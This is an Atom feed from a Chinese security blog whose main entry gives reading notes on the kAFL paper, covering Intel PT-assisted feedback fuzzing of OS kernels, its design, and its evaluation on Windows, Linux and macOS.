<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>arttnba3&#39;s blog</title>
  
  <subtitle>arttnba3的秘密小屋</subtitle>
  <link href="https://arttnba3.github.io/atom.xml" rel="self"/>
  
  <link href="https://arttnba3.github.io/"/>
  <updated>2024-07-30T14:29:19.228Z</updated>
  <id>https://arttnba3.github.io/</id>
  
  <author>
    <name>arttnba3</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【PAPER.0x07】论文笔记：kAFL: Hardware-Assisted Feedback Fuzzing for OS Kernels</title>
    <link href="https://arttnba3.github.io/2024/07/30/PAPER-0X07-KAFL/"/>
    <id>https://arttnba3.github.io/2024/07/30/PAPER-0X07-KAFL/</id>
    <published>2024-07-30T11:53:16.000Z</published>
    <updated>2024-07-30T14:29:19.228Z</updated>
    
    <content type="html"><![CDATA[<p>Rabbit’s adventures in kernel land</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>在<a href="https://arttnba3.cn/2023/10/27/PAPER-0X04-HYPER_CUBE/">上一篇论文</a>当中我们介绍了这个作者针对虚拟机设计的 fuzzer，这次我们来看他的<a href="https://www.usenix.org/system/files/conference/usenixsecurity17/sec17-schumilo.pdf">另一篇</a>使用 Intel PT 技术辅助的一个针对 OS kernel 设计的 fuzzer：<a href="https://github.com/RUB-SysSec/kAFL">kAFL</a></p><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>基于反馈的 fuzzing 非常强大，但对内核进行 fuzz 难以应用反馈机制（即代码覆盖率指导），且内核 crash 导致的 os 重启会影响 fuzz 的性能</p><p>本文使用虚拟化技术与 Intel PT（Processor Trace）技术带来独立于 OS 的硬件辅助的 fuzzing 解决方案，这使得我们只需要额外开发一小部分与内核交互的用户空间组件；作者还开发了 <a href="https://github.com/RUB-SysSec/kAFL">kernel-AFL 框架</a>，并在 Linux、Windows、macOS 上找到数个漏洞</p><h1 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01. Introduction"></a>0x01. Introduction</h1><blockquote><p>经典的不用看的章节</p></blockquote><p>过去人们主要关注更容易被利用的用户态应用的安全漏洞，而随着用户态的各种加固，内核开始更加吸引攻击者</p><p>模糊测试长期以来被用来寻找漏洞，最新的反馈驱动型 fuzzer 通过反馈机制学习输入的有趣性并以此生成更多可能触发新路径的输入，但最火的 AFL 仅限于用户空间，fuzz 内核存在一系列额外的挑战：crash 与 timeout 需要虚拟化技术捕获并优雅地继续、内核代码存在更多不确定性、缺少 fuzz 命令行程序那样通过 stdin 直接输入的简易方法、部分内核组件不开源而无法在性能不损耗的情况下插桩</p><p>过去的内核 fuzzing 方法依赖于特定的驱动或是重编译，且由于使用模拟的缘故速度非常慢，或是非反馈驱动</p><p>本文介绍一种无需 ring0 代码甚至特定于 OS 的代码便能够对任意（甚至闭源）x86-64 内核进行 feedback fuzzing 的技术，实现为 kernel-AFL，Intel PT 技术提供了控制流信息，且生成反馈信息的开销极小（5%）</p><p>总而言之，本篇论文贡献如下：</p><ul><li><strong>OS independence</strong>：作者展示了使用 VMM 生成覆盖率来对大部分闭源内核组件进行反馈驱动 fuzzing 是可行的</li><li><strong>Hardware-assisted feedback</strong>：作者使用了 Intel Process Trace 技术，其开销极小</li><li><strong>Extensible and modular design</strong>：作者使用了模块化设计，方便支持其他的 x86 内核&#x2F;用户组件</li><li><strong>kernel-AFL</strong>：作者使用自己的理念开发了原型系统 <a href="https://github.com/RUB-SysSec/kAFL">kernel-AFL</a></li></ul><h1 id="0x02-Technical-Background"><a href="#0x02-Technical-Background" class="headerlink" title="0x02. Technical Background"></a>0x02. Technical Background</h1><p>本节介绍后续章节涉及的硬件特性</p><h2 id="2-1-x86-64-Virtual-Memory-Layouts"><a href="#2-1-x86-64-Virtual-Memory-Layouts" class="headerlink" title="2.1 x86-64 Virtual Memory Layouts"></a>2.1 x86-64 Virtual Memory Layouts</h2><p>内核空间通常位于虚拟高地址部分而用户空间位于低地址部分，OS 处理任务通常不会切换 CR3，而是在同一地址空间处理</p><h2 id="2-2-Intel-VT-x"><a href="#2-2-Intel-VT-x" class="headerlink" title="2.2 Intel VT-x"></a>2.2 Intel VT-x</h2><p>我们将 CPU 分为三类：物理 CPU、逻辑 CPU（超线程可能带来多于物理 CPU 数量的逻辑 CPU，但仅有一个同时活动）、虚拟 CPU（基于逻辑 CPU 建立）</p><p>虚拟化中角色分为两种：虚拟机监视器（Virtual Machine Monitor）和虚拟机（Virtual Machine），VMM 管控 VM，VM 在 VMM 提供的透明上下文中执行</p><p>Intel VT-x 技术提供了硬件辅助的 CPU 虚拟化特性，将 CPU 额外分为 VMXOFF（不开启虚拟化）与 VMXON（开启虚拟化）的运行模式，并区分 VMX non-root（用于 VM）与 VMX root（用于 VMM）两种执行模式</p><p>VM 可能通过各种原因触发 VM-Exit 事件将控制权转交给 VMM 进行处理，VMM 通过包含 vCPU 信息的 VMCS 结构创建、启动、控制 VM</p><h2 id="2-3-Intel-PT"><a href="#2-3-Intel-PT" class="headerlink" title="2.3 Intel PT"></a>2.3 Intel PT</h2><p>Intel 自第五代处理器引入 Intel PT 技术，提供执行和分支跟踪信息，不同于 <code>Intel Last Branch Record</code> 这样的分支记录技术，输出缓冲区的大小仅受主存大小而非特定寄存器的限制，输出格式基于数据包（packet-oriented）并分为通用执行信息与控制流信息包；Intel 在运行时提供各类控制流相关的数据包类型，因此我们需要用被跟踪的软件来翻译包含控制流分支地址的包</p><p>Intel 指定了五种类型的控制流影响指令，称为 <code>Change of Flow Instruction</code> （CoFI），不同类型的 CoFI 执行结果产生不同的信息包流，与本文相关的三种为：</p><ul><li><strong>Taken-Not-Taken</strong>（TNT）：条件跳转是否执行</li><li><strong>Target IP</strong>（TIP）：间接跳转或转移指令（<code>indirect branch, near ret, far transfer</code>）的目标</li><li><strong>Flow Update Packets</strong>（FUP）：如中断或陷阱等异步事件， FUP 之后通常跟随一个 TIP 以指示接下来的指令</li></ul><p>为了限制生成的数据量，Intel PT 提供了多种运行时过滤选项，如指令指针地址范围或特权级别（CPL），kAFL 以此将追踪限制为内核模式，同时利用 CR3 过滤来限制为特定的软件</p><p>Intel PT 支持为输出数据配置多目标域，kAFL 关注于允许指定多个输出区域的物理地址表（Table of Physical Addresses，ToPA）机制：每个 ToPA 表包含多个 ToPA 条目，其中包含用来存储追踪数据的内存块的物理地址、大小、类型（用于指示 CPU 访问 ToPA 表项时的行为）等信息</p><h1 id="0x03-System-Overview"><a href="#0x03-System-Overview" class="headerlink" title="0x03. System Overview"></a>0x03. System Overview</h1><p>这节介绍系统总体架构，分为三个组件：fuzzing logic、VM infrastructure（ QEMU-PT 与 KVM-PT）、user mode agent，整体架构如图 1 所示：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20240130045624.png"></p><p>模糊测试过程如图 2 所示：</p><ul><li><p>在 VM 启动时 user mode agent 的第一部分（loader）使用 hypercall <code>HC_SUBMIT_PANIC</code> 来向 QEMU-PT 提交 <code>kernel panic handler</code>  （Windows 下为 <code>BugCheck()</code> ）的地址，QEMU-PT 将其更改为一个 hypercall 调用例程以让我们快速得知 VM 中的 crashes</p></li><li><p>loader 使用 hypercall <code>HC_GET_PROGRAM</code> 来获取实际的 user mode agent 并启动</p></li><li><p>fuzzer 开始初始化，agent 触发一个会由 KVM-PT 处理的 hypercall <code>HC_SUBMIC_CR3</code>，hypervisor 从当前运行的程序中提取 CR3 的值并交给 QEMU-PT 进行过滤</p></li><li><p>最后，agent 使用 hypercall <code>HC_SUBMIT_BUFFER</code> 来提交其想要获取输入的地址，接下来开始主 fuzzing 循环</p></li><li><p>在主循环中，agent 通过 hypercall  <code>HC_GET_INPUT</code> 来获取新的输入，fuzzing logic 生成一个新的输入并交给 QEMU-PT 由其拷贝到 guest 内存中</p></li><li><p>在 VM-Entry 恢复虚拟机执行时开启 PT 追踪机制，此时 agent 使用输入与内核交互，在 Fuzzing 过程中 QEMU-PT 解码追踪数据并在需要时更新位图</p></li><li><p>交互完成后 agent 通过 hypercall <code>HC_FINISHED</code> 告知 hypervisor 停止追踪，位图被传递给 fuzzing logic 后续使用</p></li><li><p>最后 agent 可以继续运行任何未被追踪的清理程序，然后发出另一个 <code>HC_GET_INPUT</code> 以启动下一次循环迭代</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20240130045949.png"></p><h2 id="3-1-Fuzzing-Logic"><a href="#3-1-Fuzzing-Logic" class="headerlink" title="3.1 Fuzzing Logic"></a>3.1 Fuzzing Logic</h2><p><code>fuzzing logic</code> 是 kAFL 的控制组件，负责管理种子、生成输入等，大量采用了 AFL 所用的算法（如使用位图记录块转移），且使用并行 VM 协调提升性能，并负责与 QEMU-PT 通信以及显示统计数据</p><h2 id="3-2-User-Mode-Agent"><a href="#3-2-User-Mode-Agent" class="headerlink" title="3.2 User Mode Agent"></a>3.2 User Mode Agent</h2><p>在目标 OS 中运行的 <code>User Mode Agent</code> 通过 hypercall 与 <code>fuzzing logic</code> 同步并获取新输入以与内核交互，在实践中作者额外使用<code>loader component</code> 通过 hypercall 接收  <code>User Mode Agent</code> 二进制并执行，同时负责检查 agent 的状态</p><h2 id="3-3-Virtualization-Infrastructure"><a href="#3-3-Virtualization-Infrastructure" class="headerlink" title="3.3 Virtualization Infrastructure"></a>3.3 Virtualization Infrastructure</h2><p><code>fuzzing logic</code> 使用 QEMU-PT 与 KVM-PT 交互以创建 VMs，KVM-PT 允许我们限定 Intel PT 范围为 vCPU 执行期间，QEMU-PT 负责与 KVM-PT 交互以配置 Intel PT 并访问与解码 output buffer 的追踪数据为被执行的条件跳转指令的地址的流，且基于已知非确定性基本款地址进行过滤（以预防假阳性）后以 AFL 兼容的位图格式提供给 fuzzing logic</p><p>作者使用客制化的 Intel PT 解码器，与 Intel 的现有方案比带来了性能提升</p><h2 id="3-4-Stateful-and-Non-Deterministic-Code"><a href="#3-4-Stateful-and-Non-Deterministic-Code" class="headerlink" title="3.4 Stateful and Non-Deterministic Code"></a>3.4 Stateful and Non-Deterministic Code</h2><p>内核层的状态与异步性导致的不确定性需要被处理，状态不会被重置因为快照加载成本过高，中断可能带来不确定性基本块转移，作者使用两种技术解决这些问题：</p><p>第一种是过滤出中断及中断处理造成的转移，这可以通过 Intel PT 的追踪数据（带有 FUP 的 TIP）指示，丢弃直到 <code>iret</code> 指令前的基本块，同时通过一个简易的调用栈追踪所有中断（因为可能存在中断嵌套）</p><p>第二种是拉黑所有非确定性出现的基本块，作者会在位图更新时连续多次重新运行输入，将没有在所有试验中出现的基本块拉入黑名单，在后续处理在过滤</p><blockquote><p>注：笔者认为作者使用的第二种技术可能会存在非常大的假阳性，因为内核在不同状态下同一输入的结果可能也是不同的</p></blockquote><h2 id="3-5-Hypercall"><a href="#3-5-Hypercall" class="headerlink" title="3.5 Hypercall"></a>3.5 Hypercall</h2><p>hypercall 由 <code>vmcall</code> 指令调起以主动触发 VM-Exit，作者修改了 KVM-PT 以接收 ring3 的 hypercall，并通过 <code>rcx</code> 寄存器传参，例如 <code>HC_SUBMIT_BUFFER</code> 通过 <code>rcx</code> 存储一个 guest 指针，另一个例子是告知 <code>fuzzing logic</code> 目标 OS 发生了 crash，注入的代码如 List 1 所示</p><p><img src="https://s2.loli.net/2024/07/30/WHY1MB5kzoqf6cp.png" alt="Listing 1: Hypercall crash notifier."></p><h1 id="0x04-Implementation-Details"><a href="#0x04-Implementation-Details" class="headerlink" title="0x04. Implementation Details"></a>0x04. Implementation Details</h1><p>代码开源于 <a href="https://github.com/RUB-SysSec/kAFL">https://github.com/RUB-SysSec/kAFL</a></p><h2 id="4-1-KVM-PT"><a href="#4-1-KVM-PT" class="headerlink" title="4.1 KVM-PT"></a>4.1 KVM-PT</h2><p>Intel PT 允许我们在不修改&#x2F;重编译目标内核的情况下追踪分支转移，据作者所知过去不曾有公开可用的驱动能够使用 Intel PT 仅追踪单个 vCPU 的 guest 执行，如 <a href="https://github.com/andikleen/simple-pt">Simple-PT</a> 在设计上不支持长期追踪，<a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/plain/tools/perf/Documentation/intel-pt.txt?id=refs/tags/v4.8">perf-subsystem</a> 可以长期追踪但仅能追踪逻辑 CPU 而非 vCPU</p><p>为了解决这些缺点，作者开发了 KVM-PT，其允许我们在无限长的时间内追踪 vCPU ，并导出一个用户模式接口供 QEMU-PT 访问追踪数据</p><h3 id="4-1-1-vCPU-Specific-Traces"><a href="#4-1-1-vCPU-Specific-Traces" class="headerlink" title="4.1.1 vCPU Specific Traces"></a>4.1.1 vCPU Specific Traces</h3><p>开启 Intel PT 需要在 ring0 启用 MSR 寄存器的 <code>IA32_RTIT_CTL_MSR.TraceEn</code> 位，这需要在进入 VM 前完成，在 VM-Exit 后则需要反向操作，而手动修改 MSR 会产生不必要的追踪数据，作者使用 Intel VT-x 的 MSR 自动加载功能（如修改 <code>VMCS.VM_ENTRY_CONTROL_MSR</code> ）来在 VM-Entry &amp; VM-Exit 时加载预配置 MSR</p><blockquote><p>笔者注：这点事都能写这么一大段❓</p></blockquote><h3 id="4-1-2-Continuous-Tracing"><a href="#4-1-2-Continuous-Tracing" class="headerlink" title="4.1.2 Continuous Tracing"></a>4.1.2 Continuous Tracing</h3><p>如图 3 所示的物理地址表（Table of Physical Addresses,ToPA）项结构体数组用以指示 Intel PT 如何填充缓冲区，在主缓冲区填满后 CPU 可以停止追踪或是产生能造成 VM-Exit 的中断（当前的实现为非即时）以让 VMM 重置缓冲区后恢复 VM 执行，overflow buffer 被放置在 main buffer 后以避免实际传递中断前可能的追踪数据丢失（其若也溢出则导致追踪停止，此时会新增一个数据表指示数据丢失）</p><p><img src="https://s2.loli.net/2024/07/30/A4IKLpswex36Vi5.png" alt="Figure 3: KVM-PT ToPA configuration."></p><h2 id="4-2-QEMU-PT"><a href="#4-2-QEMU-PT" class="headerlink" title="4.2 QEMU-PT"></a>4.2 QEMU-PT</h2><p>QEMU-PT 通过 KVM-PT 的用户空间接口（<code>ioctl()</code> 与 <code>mmap()</code> ）配置 Intel PT 并定期检查 ToPA，并将 Intel PT 数据包解码为类似 AFL 的位图</p><p><img src="https://s2.loli.net/2024/07/30/EaOTDcZjyh6oWrX.png" alt="Figure 4: Overview of the pipeline that converts Intel PT traces to kAFL bitmaps."></p><h3 id="4-2-1-PT-Decoder"><a href="#4-2-1-PT-Decoder" class="headerlink" title="4.2.1 PT Decoder"></a>4.2.1 PT Decoder</h3><p>解码器需要足够高效以应对产生速率为几百 MB 每秒的内核模糊测试追踪数据，且需要足够的精确</p><p>Intel 为客制 Intel PT 解码器提供了自己的通用解码引擎 <a href="https://github.com/intel/libipt">libipt</a> ，但 kAFL 仅依赖流信息，而 libipt 在提供执行数据与流信息的同时并不缓存反汇编指令，因此作者实现了一个类似即时（just-in-time）解码器的软件，并缓存所有反汇编指令以优化查找，同时忽视与测试用例无关的数据包</p><p>作者的解码器在 ToPA 区域被填充后便开始解码（而非等待填满），并翻译为 AFL 位图格式</p><h2 id="4-3-AFL-Fuzzing-Logic"><a href="#4-3-AFL-Fuzzing-Logic" class="headerlink" title="4.3 AFL Fuzzing Logic"></a>4.3 AFL Fuzzing Logic</h2><p>作者的 fuzzing logic 与 AFL 十分相似，每个基本块被给予一个随机 ID，从块 A 到 B 的转移被通过如下方程赋予一个偏移值到位图中：</p><p><img src="https://s2.loli.net/2024/07/30/IiFG56ULtmM2qlZ.png"></p><p>不同于编译期随机，kAFL 使用基本块的地址作为 ID，在观测到转移后便增加位图中计数，在 fuzzing 迭代结束后将位图的每个 entry 舍入以仅保留最高位，并与全局静态位图对比以检查是否发现新位，若是则添加到全局静态位图并将触发新位的输入添加到队列中，当发现了有趣的输入时则进行逐字节变异，该阶段完成后在随机位置进行变异（若前阶段发现新的输入则将推迟），触发新转移的输入将会给予更高的优先级</p><h1 id="0x05-Evaluation"><a href="#0x05-Evaluation" class="headerlink" title="0x05. Evaluation"></a>0x05. Evaluation</h1><p>作者的实验机器为 <code>Intel i7-6700 processor, 32 GB DDR4 RAM</code> ，为避免 IO 性能影响，所有基准测试在一个 RAM disk 上完成</p><p>类似 AFL ，若一个造成 crash  的输入触发了此前未有的基本块转移，则作者认为其是唯一的（但不意味着底层错误唯一）</p><h2 id="5-1-Fuzzing-Windows"><a href="#5-1-Fuzzing-Windows" class="headerlink" title="5.1 Fuzzing Windows"></a>5.1 Fuzzing Windows</h2><p>作者实现了一个小的特定于 Windows 10 的 user mode agent，通过虚拟磁盘对 NTFS 的 4 天 + 19 小时 fuzzing 后找到了 59 个独立的 crashes（都是除以 0 错误），经检查作者怀疑可能只有一个独立的错误</p><p>此外作者还实现了一个通用 syscall fuzzing agent，但在 Windows 下 13 个小时的 6.3 百万次执行中未发现 crash，由于 kAFL 得益于覆盖率反馈很快习得如何生成有效载荷以执行有效系统调用，导致了 fuzzing agent 中的意外的用户回调，从而使得 agent 需要高昂开销以重启，导致美妙仅能执行约 134 次</p><h2 id="5-2-Fuzzing-Linux"><a href="#5-2-Fuzzing-Linux" class="headerlink" title="5.2 Fuzzing Linux"></a>5.2 Fuzzing Linux</h2><p>作者为 Linux 实现了一个类似的 agent 以测试 ext4 ，但效率比 Windows 快得多（每秒 1k～2k次执行），从而在 12 天的测试中发现了 160 个独立的 crash 并确认了多个 bug，图 5 展示了另一个模糊测试的前 32 小时</p><p><img src="https://s2.loli.net/2024/07/30/qjA8raLVybPzdWI.png" alt="Figure 5: Fuzzing the ext4 kernel module for 32 hours."></p><h2 id="5-3-Fuzzing-macOS"><a href="#5-3-Fuzzing-macOS" class="headerlink" title="5.3 Fuzzing macOS"></a>5.3 Fuzzing macOS</h2><p>作者在 HFS 驱动中找到了 150 个 crash 并手动确认了至少三个为导致内核崩溃的独立漏洞，这可以造成 DoS 攻击，此外 kAFL 在 APFS 内核扩展中发现了 220 个独立的 crash，目前都被上报给了 Apple</p><h2 id="5-4-Rediscovery-of-Known-Bugs"><a href="#5-4-Rediscovery-of-Known-Bugs" class="headerlink" title="5.4 Rediscovery of Known Bugs"></a>5.4 Rediscovery of Known Bugs</h2><p>作者在 <code>keyctl()</code> 接口上评估了 kAFL，成功找到此前已知的 CVE-2016-07583，并找到了一个未知错误（已被分配为 CVE-2016-86504），其在短短一小时内成功触发 17 个独立的 KASan 报告与 15 个独立的 panic，生成了超过 3400 万个输入，发现了 295 个有趣的输入，每秒执行约 9k 次，该实验为 8 进程并行</p><h2 id="5-5-Detected-Vulnerabilities"><a href="#5-5-Detected-Vulnerabilities" class="headerlink" title="5.5 Detected Vulnerabilities"></a>5.5 Detected Vulnerabilities</h2><p>kAFL 在测试过程中发现超过 1k 个独立的 crash，作者手动分析了一部分并与对应的维护者确认了如下漏洞：</p><p><img src="https://s2.loli.net/2024/07/30/fiTSLREMCYJ3yUF.png"></p><h2 id="5-6-Fuzzing-Performance"><a href="#5-6-Fuzzing-Performance" class="headerlink" title="5.6 Fuzzing Performance"></a>5.6 Fuzzing Performance</h2><p>作者创建了一个基于 jsmn 的 JSON parser driver（如 List 2 所示，在 JSON 字符串以 <code>&quot;KAFL&quot;</code> 起始时触发 crash）并在三个系统上进行了测试，并与 TriforceAFL 和 syzkaller 进行对比</p><p><img src="https://s2.loli.net/2024/07/30/SjNFMhyBD1oHze6.png" alt="Listing 2: The JSON parser kernel module used for the coverage benchmarks."></p><p>30 分钟的测试结果如表 1 所示，然而 TriforceAFL 未能触发崩溃路径，因而很难与 kAFL 比较覆盖率</p><p><img src="https://s2.loli.net/2024/07/30/xW3cr8Zqo2fleR9.png" alt="Table 1: kAFL and TriforceAFL fuzzing performance on the JSON sample driver."></p><p>覆盖率结果如图 6 所示，不过随着 fuzzing 时间增长，新路径更难被发现，因此这不是个好的指标</p><p><img src="https://s2.loli.net/2024/07/30/rYB9mdXJPUAhbRt.png" alt="Figure 6: Coverage comparison of kAFL (initramfs) and TriforceAFL. kAFL takes less than 3 minutes to find the same number of paths as TriforceAFL does in 30 minutes (each running 1 process)."></p><p>图 7 显示了 kAFL 与 TriforceAFL 在 raw execution 上的性能对比</p><p><img src="https://s2.loli.net/2024/07/30/4ArNBvGP57hx8Hn.png" alt="Figure 7: Raw execution performance comparison."></p><p>与 syzkaller 间作者并未做性能对比，因为其是一个高度特定的 syzkaller fuzzer，且其知识使其可以在无反馈下产生更高的代码覆盖率，因此除非作者实现了相同的系统调用逻辑，否则覆盖率对比会存在误导性</p><h2 id="5-7-KVM-PT-Overhead"><a href="#5-7-KVM-PT-Overhead" class="headerlink" title="5.7 KVM-PT Overhead"></a>5.7 KVM-PT Overhead</h2><p>作者在一个 <code>i5-6500@3.2Ghz</code> 桌面环境中对了不同的 KVM-PT 配置，将追踪限定在内核地址空间，图 8 说明了没有 KVM-PT 下的执行相对开销</p><blockquote><p>多的不抄了，自己看原文：）</p></blockquote><p><img src="https://s2.loli.net/2024/07/30/e1QHoCktLNDbGvu.png" alt="Figure 8: Overhead for compiling QEMU-2.6.0 in a traced VM."></p><h2 id="5-8-Decoder-Engine"><a href="#5-8-Decoder-Engine" class="headerlink" title="5.8 Decoder Engine"></a>5.8 Decoder Engine</h2><p>解码过程没有硬件加速，因此解码器对 fuzzing 整体性能有显著影响，作者将自己的解码器与 Intel ptxed 进行了对比，在一个 <code>i5-6500@3.2Ghz</code> 环境中进行了测试，结果如图 9 所示</p><p><img src="https://s2.loli.net/2024/07/30/bZ7wTskyI1F2dm9.png" alt="Figure 9: kAFL and ptxed decoding time on multiple copies of the same trace (kAFL is up to 30 times faster)."></p><h1 id="0x06-Related-Work"><a href="#0x06-Related-Work" class="headerlink" title="0x06. Related Work"></a>0x06. Related Work</h1><h2 id="6-1-Black-Box-Fuzzers"><a href="#6-1-Black-Box-Fuzzers" class="headerlink" title="6.1 Black-Box Fuzzers"></a>6.1 Black-Box Fuzzers</h2><p>此类 fuzzer 与目标程序没有任何交互，为了提高效率通常会进行一些假设，例如 <a href="https://github.com/aoh/radamsa">Radamsa</a> 或 <a href="https://github.com/samhocevar/zzuf">zzuf</a> 会假设大量覆盖率良好的输入会反复发生变异与重组，而 <a href="http://www.peachfuzzer.com/">Peach</a> 与 <a href="https://github.com/OpenRCE/sulley">Sulley</a> 需要程序员指定如何生成看起来几乎像真正文件的半可用输入文件；上述这些都有一个重要缺陷：耗时过高</p><p>为了提高黑盒 fuzzer 的性能，研究人员提出了不少技术，如 <a href="https://www.usenix.org/conference/usenixsecurity12/technical-sessions/presentation/holler">Holler 提出了从旧的 crash 输入中习得输入语法的有趣部分</a> ，还有人提出根据程序追踪来推断输入语法等，<a href="https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-rebert.pdf">Rebert 则优化了对有趣输入的选择</a></p><h2 id="6-2-White-Box-fuzzers"><a href="#6-2-White-Box-fuzzers" class="headerlink" title="6.2 White-Box fuzzers"></a>6.2 White-Box fuzzers</h2><p>程序分析方法被引入以减少测试负担，类似 <a href="https://dl.acm.org/doi/pdf/10.1145/2090147.2094081">SAGE</a> 、<a href="https://dl.acm.org/doi/10.1145/1064978.1065036">DART</a> 、 <a href="https://www.usenix.org/legacy/event/osdi08/tech/full_papers/cadar/cadar.pdf">KLEE</a> 、 <a href="https://www.usenix.org/legacy/events/sec09/tech/full_papers/molnar.pdf">SmartFuzz</a> 、<a href="https://ieeexplore.ieee.org/document/6234425">Mayhem</a> 这样的工具尝试使用符号执行与约束求解技术枚举复杂路径，<a href="https://ieeexplore.ieee.org/document/5504701">TaintScope</a> 、<a href="https://ieeexplore.ieee.org/document/5070546">BuzzFuzz</a> 、<a href="https://www.ndss-symposium.org/ndss2017/ndss-2017-programme/vuzzer-application-aware-evolutionary-fuzzing/">Vuzzer</a> 利用污点追踪与类似的动态分析技术来发现新路径，他们通常都能找到隐藏在 checksum、magic constraint 等难以被随机输入满足的复杂代码路径，另一种办法是使用相同类型的信息来搜索危险行为而非新代码路径</p><p>缺点是这些技术通常难以实现并扩展到大型程序上，据作者所知目前暂时没有针对操作系统的这样的工具</p><h2 id="6-3-Gray-Box-Fuzzers"><a href="#6-3-Gray-Box-Fuzzers" class="headerlink" title="6.3 Gray-Box Fuzzers"></a>6.3 Gray-Box Fuzzers</h2><p>灰盒 fuzzer 在保留黑盒的高吞吐量与简易性获得白盒所使用的高级机制提供的额外覆盖，比较好的灰盒测试的例子是 AFL，其使用覆盖率信息指引以避免在不触发新状态的输入上耗费时间，其他的一些 fuzzer 也使用了类似机制</p><p>为了进一步提高灰盒测试的有效性，许多用在黑盒测试中的技术也被使用，例如 <a href="https://dl.acm.org/doi/10.1145/2976749.2978428">Böhme 展示了如何使用马尔可夫链来提高灰盒测试性能</a></p><h2 id="6-4-Coverage-Guided-Kernel-Fuzzers"><a href="#6-4-Coverage-Guided-Kernel-Fuzzers" class="headerlink" title="6.4 Coverage-Guided Kernel Fuzzers"></a>6.4 Coverage-Guided Kernel Fuzzers</h2><p>Vyukov 放出的项目 <a href="https://github.com/google/syzkaller">syzkaller</a> 是第一个公开的能够用于覆盖率引导的内核 fuzzer ；Nossum 与 Casanovas 通过一个<a href="https://events.static.linuxfound.org/sites/events/files/slides/AFL%20filesystem%20fuzzing%2C%20Vault%202016_0.pdf">修改版 AFL</a> 证明了绝大部分 Linux 文件系统驱动对于反馈驱动的模糊测试都是脆弱的</p><p>Hertz 和 Newsham 在 2016 年发布了名为 <a href="https://github.com/nccgroup/TriforceAFL">TriforceAFL</a> 的 AFL 修改版，其基于一个修改版的 QEMU ，利用了对应的模拟后端通过在执行控制流更改指令后确定当前的指令指针来测量模糊测试进度，这理论上可以测试任何 QEMU 能模拟的操作系统，但事实上 TriforceAFL 仅限于能够从只读文件系统启动的操作系统（基本上只有 UNIX-like），无法测试 macOS 或 Windows 等闭源操作系统</p><h1 id="0x07-Discussion"><a href="#0x07-Discussion" class="headerlink" title="0x07. Discussion"></a>0x07. Discussion</h1><p>作者的工作仍有一些缺陷</p><p><strong>OS-Specific Code.</strong>  作者使用了少量特定于操作系统的代码来执行三个任务：将模糊测试输入转为与操作系统的交互、获取操作系统对崩溃处理程序的地址、返回某些驱动程序的地址</p><p>这些功能都不是必须的，第一个问题可以用通用系统调用来避免，同时也不一定需要崩溃处理程序的地址来检测 VM crash</p><p><strong>Supported CPUs.</strong> 本文的工作局限于支持 Intel VT-x 技术的 CPU，但对于哪些 CPU 确乎支持指令指针过滤、multi-entry ToPA 等含糊其辞，</p><p><strong>Just-In-Time Code.</strong> intel PT 并不提供已执行指令指针的完整列表，这需要解码器完成控制流重建，但若程序在运行时被修改（例如 JIT）则无法准确恢复运行时控制流，因此解码器需要对程序应用的修改信息，如 <a href="https://dl.acm.org/doi/10.1145/2523649.2523675">Deng 等人使用 EPT violation 实现</a>，更老的做法是<a href="https://dl.acm.org/doi/10.1145/1455770.1455779">使用影子页表</a></p><p><strong>Multibyte Compares.</strong> 本文的工作无法知道程序中较大的 magic values，但使用比如混合执行（如 <a href="https://sites.cs.ucsb.edu/~vigna/publications/2016_NDSS_Driller.pdf">Driller</a> ）或是污点追踪（如 <a href="https://www.ndss-symposium.org/ndss2017/ndss-2017-programme/vuzzer-application-aware-evolutionary-fuzzing/">Vuzzer</a> ）技术可以提高性能，但都无法轻易被应用到闭源操作系统内核中</p><p><strong>Ring 3 Fuzzing.</strong> 作者仅针对内核代码使用了该技术，但这个方法也适用于用于用户态，作者预计其将由于基于动态二进制插桩的方法（如 <a href="https://github.com/googleprojectzero/winafl">winAFL</a> ）</p><h1 id="0x08-Conclusion"><a href="#0x08-Conclusion" class="headerlink" title="0x08. Conclusion"></a>0x08. Conclusion</h1><p>作者提出了使用 CPU 新特性的反馈驱动的内核模糊测试方法，性能明显优于其他方法，很好很强大🎆🎇🎇🎆</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Rabbit’s adventures in kernel land&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="https://arttnba3.github.io/categories/PAPER/"/>
    
    
    <category term="信息安全" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="FUZZ" scheme="https://arttnba3.github.io/tags/FUZZ/"/>
    
    <category term="论文笔记" scheme="https://arttnba3.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
    <category term="虚拟化" scheme="https://arttnba3.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="系统虚拟化" scheme="https://arttnba3.github.io/tags/%E7%B3%BB%E7%BB%9F%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="Intel PT" scheme="https://arttnba3.github.io/tags/Intel-PT/"/>
    
  </entry>
  
  <entry>
    <title>【PAPER.0x06】论文笔记：High-density Multi-tenant Bare-metal Cloud</title>
    <link href="https://arttnba3.github.io/2024/07/27/PAPER-0X06-ASPLOS2020_BMHIVE/"/>
    <id>https://arttnba3.github.io/2024/07/27/PAPER-0X06-ASPLOS2020_BMHIVE/</id>
    <published>2024-07-26T20:25:38.000Z</published>
    <updated>2024-07-26T20:32:12.364Z</updated>
    
